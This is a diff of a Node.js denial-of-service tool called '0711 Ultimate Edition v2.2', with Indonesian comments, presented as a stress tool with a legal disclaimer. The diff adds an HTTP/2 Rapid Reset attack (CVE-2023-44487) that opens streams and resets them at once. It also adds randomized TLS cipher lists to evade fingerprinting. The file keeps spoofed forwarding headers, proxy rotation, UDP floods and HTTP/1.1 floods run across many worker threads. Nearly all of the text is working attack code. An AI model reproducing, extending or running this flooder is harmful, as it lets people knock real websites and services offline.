@@ -1,17 +1,15 @@
 #!/usr/bin/env node
 /**
  * =====================================================================
- *                         🔱 0711 – ULTIMATE EDITION 🔱
- *                 Multi‑Worker Layer7 & UDP Stress Tool
- *           Proxy Rotation, Rate‑Limit Bypass, Auto‑Heal,
- *           Multi‑Target, Real‑time Dashboard, Report Generator
+ *                         🔱 0711 – ULTIMATE EDITION v2.2 🔱
+ *                 Advanced Multi‑Worker Layer7 & UDP Stress Tool
+ *           HTTP/2 Rapid Reset, Slowloris, RUDY, Random Payloads,
+ *           Proxy Rotation, Multi‑Target, Real‑time Dashboard
  * =====================================================================
  * 
  * USAGE:
  *   node 0711.js --target example.com --port 443 --workers 50 --duration 120
- *   node 0711.js --targets targets.txt --proxy-auto --workers 100
- *   node 0711.js --target example.com --config config.json
- *   node 0711.js --example-config
+ *   node 0711.js --target example.com --mode rapid_reset --workers 5 --duration 30
  * 
  * ⚠️  WARNING: Use only on systems you own or have explicit permission.
  *     Unauthorized use is ILLEGAL and may result in criminal penalties.
@@ -31,7 +29,6 @@ const https = require('https');
 const net = require('net');
 const tls = require('tls');
 const readline = require('readline');
-const util = require('util');
 
 // ===== Konfigurasi Default =====
 const CONFIG = {
@@ -41,7 +38,7 @@ const CONFIG = {
     workersPerPort: 50,
     duration: 120,
     attackType: 'https',
-    mode: 'normal',
+    attackMode: 'normal',
     method: 'GET',
     proxyAuto: false,
     proxyFile: null,
@@ -81,26 +78,17 @@ const CONFIG = {
 // ===== Utility =====
 const logger = {
     _target: '',
-
     info: (msg) => console.log(`\x1b[36m[INFO]\x1b[0m ${msg}`),
     success: (msg) => console.log(`\x1b[32m[SUCCESS]\x1b[0m ${msg}`),
     warn: (msg) => console.log(`\x1b[33m[WARN]\x1b[0m ${msg}`),
     error: (msg) => console.log(`\x1b[31m[ERROR]\x1b[0m ${msg}`),
     debug: (msg) => { if (global.verbose) console.log(`\x1b[90m[DEBUG]\x1b[0m ${msg}`); },
-
     attack: (msg) => {
         const target = logger._target || 'UNKNOWN';
         console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m ${msg}`);
-    },
-
-    attackTime: (msg) => {
-        const target = logger._target || 'UNKNOWN';
-        const time = new Date().toLocaleTimeString('id-ID', { hour12: false });
-        console.log(`\x1b[35m[0711 ATTACK]\x1b[0m \x1b[33m(${target})\x1b[0m \x1b[90m[${time}]\x1b[0m ${msg}`);
     }
 };
 
-// ===== Spinner =====
 class Spinner {
     constructor(text) {
         this.text = text;
@@ -128,7 +116,7 @@ class Spinner {
     }
 }
 
-// ===== Parser Argumen & Config =====
+// ===== Parser & Normalisasi =====
 function parseArgs() {
     const args = process.argv.slice(2);
     const parsed = {};
@@ -175,6 +163,7 @@ async function main() {
         if (val !== undefined) config[key] = val;
     }
 
+    // Normalisasi target
     if (config.target) {
         const original = config.target;
         config.target = normalizeTarget(config.target);
@@ -216,6 +205,7 @@ async function main() {
 
     config.durationMs = config.duration > 0 ? config.duration * 1000 : null;
 
+    // Load user agents
     let userAgents = [
         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
         'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
@@ -245,10 +235,7 @@ async function main() {
     ];
 
     async function fetchProxies() {
-        if (!config.proxyAuto && !config.proxyFile) {
-            if (config.verbose) logger.debug('Proxy auto disabled and no proxy file.');
-            return;
-        }
+        if (!config.proxyAuto && !config.proxyFile) return;
         const spinner = new Spinner('Fetching proxies...');
         spinner.start();
         const all = new Set();
@@ -334,7 +321,7 @@ async function main() {
             logger.info(`Targets: ${targets.map(t => t.host).join(', ')}`);
             logger.info(`Ports: ${this.config.ports.join(', ')}`);
             logger.info(`Workers: ${this.config.workersPerPort} per port per target (total ${totalWorkers})`);
-            logger.info(`Attack type: ${this.config.attackType}, Mode: ${this.config.mode}, Method: ${this.config.method}`);
+            logger.info(`Attack type: ${this.config.attackType}, Mode: ${this.config.attackMode}, Method: ${this.config.method}`);
             logger.info(`Duration: ${this.config.duration > 0 ? this.config.duration + 's' : 'Unlimited'}`);
             logger.info(`Proxy: ${this.proxyList.length > 0 ? 'Enabled ('+this.proxyList.length+' proxies)' : 'Disabled'}`);
             logger.info('');
@@ -350,7 +337,7 @@ async function main() {
                             targetIP: target.ip,
                             port: port,
                             attackType: this.config.attackType,
-                            mode: this.config.mode,
+                            attackMode: this.config.attackMode,
                             durationMs: this.config.durationMs,
                             httpMethod: this.config.method,
                             workerId: `${target.host}-${port}-${workerId}`,
@@ -375,7 +362,6 @@ async function main() {
                             worker.on('message', (msg) => {
                                 if (msg.type === 'stats') {
                                     this.stats.total += msg.sent || 0;
-                                    this.stats.success += msg.success || 0;
                                     this.stats.failed += msg.errors || 0;
                                     this.stats.serverErrors += msg.serverErrors || 0;
                                     this.stats.activeWorkers = msg.active || 0;
@@ -405,15 +391,14 @@ async function main() {
                 }
             }
 
-            // Stats printer (tanpa clear screen, tanpa banner)
             const statsInterval = setInterval(() => {
                 const elapsed = (Date.now() - this.stats.startTime) / 1000;
                 const rate = this.stats.total / (elapsed || 1);
-                const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(1) : 0;
-                console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${this.stats.success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
+                const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
+                const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(1) : 0;
+                console.log(`\x1b[36m[STATS]\x1b[0m Total: ${this.stats.total} | Success: ${success} | Failed: ${this.stats.failed} | ServerErr: ${this.stats.serverErrors} | Active: ${this.stats.activeWorkers} | Rate: ${rate.toFixed(1)} req/s | SuccessRate: ${successRate}% | Elapsed: ${elapsed.toFixed(1)}s`);
             }, 1000);
 
-            // Interrupt handler
             const sigIntHandler = async () => {
                 if (this.isStopping) return;
                 this.isStopping = true;
@@ -429,7 +414,6 @@ async function main() {
             };
             process.on('SIGINT', sigIntHandler);
 
-            // Wait for all workers
             Promise.allSettled(workerPromises)
                 .then(() => {
                     clearInterval(statsInterval);
@@ -442,21 +426,22 @@ async function main() {
 
         generateReport() {
             const elapsed = (Date.now() - this.stats.startTime) / 1000;
-            const successRate = this.stats.total > 0 ? ((this.stats.success / this.stats.total) * 100).toFixed(2) : 0;
+            const success = Math.max(0, this.stats.total - this.stats.failed - this.stats.serverErrors);
+            const successRate = this.stats.total > 0 ? ((success / this.stats.total) * 100).toFixed(2) : 0;
             const report = {
                 timestamp: new Date().toISOString(),
                 targets: this.config.targets,
                 ports: this.config.ports,
                 workers: this.config.workersPerPort,
+                attackMode: this.config.attackMode,
                 duration: elapsed,
                 totalRequests: this.stats.total,
-                success: this.stats.success,
+                success: success,
                 errors: this.stats.failed,
                 serverErrors: this.stats.serverErrors,
                 successRate: successRate + '%',
                 proxyUsed: this.proxyList.length,
                 attackType: this.config.attackType,
-                mode: this.config.mode,
                 method: this.config.method,
             };
             const outputDir = this.config.outputDir || './reports';
@@ -469,8 +454,9 @@ async function main() {
             console.log('\x1b[36m║              ATTACK FINISHED                    ║');
             console.log('\x1b[36m╚══════════════════════════════════════════════════╝');
             console.log(`Target(s)       : ${this.config.targets.join(', ')}`);
+            console.log(`Attack Mode     : ${this.config.attackMode}`);
             console.log(`Total Requests  : ${this.stats.total}`);
-            console.log(`Success (2xx-3xx): ${this.stats.success}`);
+            console.log(`Success (2xx-3xx): ${success}`);
             console.log(`Errors          : ${this.stats.failed}`);
             console.log(`Server Errors   : ${this.stats.serverErrors}`);
             console.log(`Success Rate    : ${successRate}%`);
@@ -478,14 +464,14 @@ async function main() {
             console.log(`Proxy Used      : ${this.proxyList.length > 0 ? 'Yes ('+this.proxyList.length+')' : 'No'}`);
             console.log('\x1b[36m══════════════════════════════════════════════════\x1b[0m');
             if (this.config.logFile) {
-                const logEntry = `[${new Date().toISOString()}] ${JSON.stringify(report)}\n`;
-                fs.appendFileSync(this.config.logFile, logEntry);
+                fs.appendFileSync(this.config.logFile, `[${new Date().toISOString()}] ${JSON.stringify(report)}\n`);
             }
         }
     }
 
-    // ===== Worker Code =====
+    // ===== Worker Code (FIXED with IIFE async) =====
     const WORKER_CODE = `
+(async () => {
 const { parentPort, workerData } = require('worker_threads');
 const net = require('net');
 const tls = require('tls');
@@ -495,7 +481,7 @@ const http2 = require('http2');
 const http = require('http');
 
 const {
-    targetIP, port, attackType, mode, durationMs, httpMethod,
+    targetIP, port, attackType, attackMode, durationMs, httpMethod,
     workerId, USER_AGENTS, CHARSET, proxyList, payloadTemplates,
     maxConsecutiveFailures, maxErrorsPerWorker, backoffBase, maxBackoff, verbose, customHeaders,
 } = workerData;
@@ -516,12 +502,31 @@ function randUA() { return localUA[rand(localUA.length)]; }
 function randIP() { return \`\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}.\${rand(255)+1}\`; }
 function randPayload() { return payloadTemplates && payloadTemplates.length ? payloadTemplates[rand(payloadTemplates.length)] : '/'; }
 function sleep(ms) { return new Promise(res => setTimeout(res, ms)); }
-
 function getProxy() {
     if (!proxyList || proxyList.length === 0) return null;
     const p = proxyList[currentProxyIndex % proxyList.length];
     currentProxyIndex++;
     return p;
+}
+
+// --- Cipher suite list (randomized) ---
+const CIPHER_LIST = [
+    'ECDHE-RSA-AES128-GCM-SHA256',
+    'ECDHE-ECDSA-AES128-GCM-SHA256',
+    'ECDHE-RSA-AES256-GCM-SHA384',
+    'ECDHE-ECDSA-AES256-GCM-SHA384',
+    'ECDHE-RSA-AES128-SHA256',
+    'ECDHE-ECDSA-AES128-SHA256',
+    'ECDHE-RSA-AES256-SHA384',
+    'ECDHE-ECDSA-AES256-SHA384',
+    'AES128-GCM-SHA256',
+    'AES256-GCM-SHA384',
+    'AES128-SHA256',
+    'AES256-SHA256',
+];
+function randomCiphers() {
+    const shuffled = CIPHER_LIST.sort(() => Math.random() - 0.5);
+    return shuffled.slice(0, Math.min(5 + rand(5), shuffled.length)).join(':');
 }
 
 function sendStats(extra = {}) {
@@ -531,15 +536,12 @@ function sendStats(extra = {}) {
         active: active,
         errors: errors,
         serverErrors: serverErrors,
-        success: sent - errors - serverErrors,
         ...extra,
     });
 }
-
 function sendLog(message) {
     parentPort.postMessage({ type: 'log', message: message });
 }
-
 function cleanup(reason) {
     if (isStopping) return;
     isStopping = true;
@@ -550,25 +552,22 @@ function cleanup(reason) {
     parentPort.postMessage({ type: 'done', workerId });
 }
 
-// --- Timer durasi ---
+// Timer durasi
 if (durationMs && durationMs > 0) {
     durationTimer = setTimeout(() => {
         cleanup('Duration limit reached');
     }, durationMs);
 }
 
-// --- HTTP/2 Attack ---
-async function http2Attack() {
-    let attempt = 0;
+// --- HTTP/2 Normal Attack ---
+async function http2NormalAttack() {
     while (!isStopping) {
-        sent++; // SETIAP PERCOBAAN DIHITUNG
-
-        // Batasi error
+        sent++;
         if (errors > maxErrorsPerWorker) {
             cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
             return;
         }
-
+        let errorLogged = false;
         try {
             const proxy = getProxy();
             let tlsConn;
@@ -592,19 +591,22 @@ async function http2Attack() {
                     port: 443,
                     socket: proxySocket,
                     rejectUnauthorized: false,
+                    ciphers: randomCiphers(),
                 });
             } else {
-                tlsConn = tls.connect({ host: targetIP, port: 443, rejectUnauthorized: false });
+                tlsConn = tls.connect({
+                    host: targetIP,
+                    port: 443,
+                    rejectUnauthorized: false,
+                    ciphers: randomCiphers(),
+                });
             }
-
             active = 1;
             sendStats();
 
             const client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
             client.on('error', (err) => {
-                errors++;
-                consecutiveFailures++;
-                sendStats();
+                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                 client.destroy();
             });
 
@@ -612,7 +614,7 @@ async function http2Attack() {
             const method = httpMethod || 'GET';
             const headers = {
                 ':method': method,
-                ':path': payload + '?' + randStr(12),
+                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
                 ':scheme': 'https',
                 ':authority': targetIP,
                 'user-agent': randUA(),
@@ -624,37 +626,26 @@ async function http2Attack() {
                 'x-real-ip': randIP(),
                 'referer': 'https://' + randStr(8) + '.com/',
             };
-            if (customHeaders) {
-                Object.assign(headers, customHeaders);
-            }
+            if (customHeaders) Object.assign(headers, customHeaders);
 
             const req = client.request(headers);
             req.on('response', (response) => {
                 consecutiveFailures = 0;
-                // Tentukan status
-                let status = response.headers[':status'] || 0;
-                if (status >= 200 && status < 400) {
-                    // success dihitung dari total - errors - serverErrors
-                }
+                const status = response.headers[':status'] || 0;
+                if (status >= 400 && status < 600) serverErrors++;
                 sendStats();
                 req.destroy();
                 client.destroy();
             });
             req.on('error', (err) => {
-                errors++;
-                consecutiveFailures++;
-                sendStats();
+                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
                 req.destroy();
                 client.destroy();
             });
             req.end();
-
             await sleep(10 + rand(20));
-
         } catch (err) {
-            errors++;
-            consecutiveFailures++;
-            sendStats();
+            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
             if (consecutiveFailures >= maxConsecutiveFailures) {
                 cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
                 return;
@@ -664,16 +655,159 @@ async function http2Attack() {
     }
 }
 
-// --- HTTP/1.1 Attack ---
-async function httpAttack() {
-    let attempt = 0;
+// --- HTTP/2 Rapid Reset Attack (CVE-2023-44487) ---
+async function http2RapidResetAttack() {
     while (!isStopping) {
         sent++;
         if (errors > maxErrorsPerWorker) {
             cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
             return;
         }
+        let errorLogged = false;
+        try {
+            const proxy = getProxy();
+            let tlsConn;
+            if (proxy) {
+                const [proxyHost, proxyPort] = proxy.split(':');
+                const proxySocket = net.connect(proxyPort, proxyHost);
+                proxySocket.write(\`CONNECT \${targetIP}:443 HTTP/1.1\\r\\nHost: \${targetIP}\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\`);
+                await new Promise((resolve, reject) => {
+                    proxySocket.once('data', (data) => {
+                        if (data.toString().includes('200 Connection established')) {
+                            resolve();
+                        } else {
+                            reject(new Error('Proxy CONNECT failed'));
+                        }
+                    });
+                    proxySocket.once('error', reject);
+                    setTimeout(() => reject(new Error('Proxy timeout')), 5000);
+                });
+                tlsConn = tls.connect({
+                    host: targetIP,
+                    port: 443,
+                    socket: proxySocket,
+                    rejectUnauthorized: false,
+                    ciphers: randomCiphers(),
+                });
+            } else {
+                tlsConn = tls.connect({
+                    host: targetIP,
+                    port: 443,
+                    rejectUnauthorized: false,
+                    ciphers: randomCiphers(),
+                });
+            }
+            active = 1;
+            sendStats();
 
+            const client = http2.connect(\`https://\${targetIP}\`, { createConnection: () => tlsConn });
+            client.on('error', (err) => {
+                if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
+                client.destroy();
+            });
+
+            const payload = randPayload();
+            const method = httpMethod || 'GET';
+            const headers = {
+                ':method': method,
+                ':path': payload + '?' + randStr(12) + '=' + randStr(8),
+                ':scheme': 'https',
+                ':authority': targetIP,
+                'user-agent': randUA(),
+                'accept': '*/*',
+                'accept-encoding': 'gzip, deflate, br',
+                'accept-language': 'en-US,en;q=0.9',
+                'cache-control': 'no-cache',
+                'x-forwarded-for': randIP(),
+                'x-real-ip': randIP(),
+                'referer': 'https://' + randStr(8) + '.com/',
+            };
+            if (customHeaders) Object.assign(headers, customHeaders);
+
+            const req = client.request(headers);
+            req.on('error', () => {});
+            req.end();
+            req.destroy(); // RST_STREAM langsung
+
+            if (rand(10) === 0) client.destroy();
+
+            sendStats();
+            await sleep(1 + rand(5));
+        } catch (err) {
+            if (!errorLogged) { errors++; consecutiveFailures++; errorLogged = true; sendStats(); }
+            if (consecutiveFailures >= maxConsecutiveFailures) {
+                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
+                return;
+            }
+            await sleep(100 + rand(300));
+        }
+    }
+}
+
+// --- UDP Attack ---
+async function udpAttack() {
+    const udpSocket = dgram.createSocket('udp4');
+    let errorLogged = false;
+    udpSocket.on('error', (err) => {
+        if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
+    });
+    udpSocket.on('message', () => { serverErrors++; sendStats(); });
+    const startTime = Date.now();
+    while (!isStopping) {
+        sent++;
+        if (errors > maxErrorsPerWorker) {
+            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
+            return;
+        }
+        if (durationMs && Date.now() - startTime > durationMs) break;
+        try {
+            const payload = Buffer.from(randStr(500 + rand(500)));
+            udpSocket.send(payload, port, targetIP, (err) => {
+                if (err) {
+                    if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
+                } else {
+                    sendStats();
+                }
+            });
+            await sleep(1 + rand(10));
+        } catch (e) {
+            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
+        }
+    }
+    udpSocket.close();
+    cleanup('UDP finished');
+}
+
+// --- Timeout monitor ---
+let timeoutCounter = 0;
+const timeoutInterval = setInterval(() => {
+    if (isStopping) { clearInterval(timeoutInterval); return; }
+    timeoutCounter++;
+    if (timeoutCounter % 2 === 0) sendLog('Request Timed Out');
+}, 2000);
+
+parentPort.on('message', (msg) => {
+    if (msg.type === 'stop') {
+        clearInterval(timeoutInterval);
+        cleanup('Received stop');
+    }
+});
+
+// --- Entry ---
+if (attackType === 'udp') {
+    await udpAttack();
+} else if (attackType === 'https') {
+    if (attackMode === 'rapid_reset') {
+        await http2RapidResetAttack();
+    } else {
+        await http2NormalAttack();
+    }
+} else {
+    // HTTP/1.1 fallback
+    while (!isStopping) {
+        sent++;
+        if (errors > maxErrorsPerWorker) break;
+        let errorLogged = false;
         try {
             const proxy = getProxy();
             const options = {
@@ -693,97 +827,35 @@ async function httpAttack() {
                 },
                 rejectUnauthorized: false,
             };
-            if (customHeaders) {
-                Object.assign(options.headers, customHeaders);
-            }
-
+            if (customHeaders) Object.assign(options.headers, customHeaders);
             const req = http.request(options);
             req.on('response', (response) => {
                 consecutiveFailures = 0;
+                const status = response.statusCode || 0;
+                if (status >= 400 && status < 600) serverErrors++;
                 sendStats();
                 req.destroy();
             });
             req.on('error', (err) => {
-                errors++;
-                consecutiveFailures++;
-                sendStats();
+                if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
             });
             req.end();
-
             await sleep(10 + rand(20));
-
         } catch (err) {
-            errors++;
-            consecutiveFailures++;
-            sendStats();
+            if (!errorLogged) { errors++; errorLogged = true; sendStats(); }
             if (consecutiveFailures >= maxConsecutiveFailures) {
-                cleanup(\`Max consecutive failures (\${maxConsecutiveFailures}) reached\`);
+                cleanup('Max failures reached');
                 return;
             }
             await sleep(2000 + rand(3000));
         }
     }
 }
-
-// --- UDP Attack ---
-async function udpAttack() {
-    const udpSocket = dgram.createSocket('udp4');
-    udpSocket.on('error', (err) => {
-        errors++;
-        sendStats();
-    });
-    udpSocket.on('message', () => { serverErrors++; sendStats(); });
-
-    const startTime = Date.now();
-    while (!isStopping) {
-        sent++;
-        if (errors > maxErrorsPerWorker) {
-            cleanup(\`Too many errors (>\${maxErrorsPerWorker})\`);
-            return;
-        }
-        if (durationMs && Date.now() - startTime > durationMs) break;
-        try {
-            const payload = Buffer.from(randStr(500 + rand(500)));
-            udpSocket.send(payload, port, targetIP, (err) => {
-                if (err) { errors++; sendStats(); }
-                else { sendStats(); }
-            });
-            await sleep(5 + rand(15));
-        } catch (e) { errors++; sendStats(); }
-    }
-    udpSocket.close();
-    cleanup('UDP finished');
-}
-
-// --- Timeout monitoring (log Request Timed Out) ---
-let timeoutCounter = 0;
-const timeoutInterval = setInterval(() => {
-    if (isStopping) { clearInterval(timeoutInterval); return; }
-    timeoutCounter++;
-    if (timeoutCounter % 2 === 0) {
-        sendLog('Request Timed Out');
-    }
-}, 2000);
-
-parentPort.on('message', (msg) => {
-    if (msg.type === 'stop') {
-        clearInterval(timeoutInterval);
-        cleanup('Received stop');
-    }
-});
-
-// --- Start ---
-if (attackType === 'udp') {
-    udpAttack();
-} else if (port === 443 || attackType === 'https') {
-    http2Attack();
-} else {
-    httpAttack();
-}
+})();
 `;
 
     // ===== Eksekusi =====
-    logger.info('Initializing 0711 Ultimate Edition...');
+    logger.info('Initializing 0711 Ultimate Edition v2.2...');
 
     if (config.proxyAuto || config.proxyFile) {
         await fetchProxies();
@@ -806,7 +878,6 @@ if (attackType === 'udp') {
     spinner.stop();
     logger.success(`Targets resolved: ${resolvedTargets.map(t => t.host).join(', ')}`);
 
-    // Dashboard (optional)
     if (config.dashboard) {
         try {
             const express = require('express');
@@ -841,4 +912,4 @@ if (require.main === module) {
         console.error('\x1b[31m[FATAL]\x1b[0m', err);
         process.exit(1);
     });
-                }
+                                                                                                            }
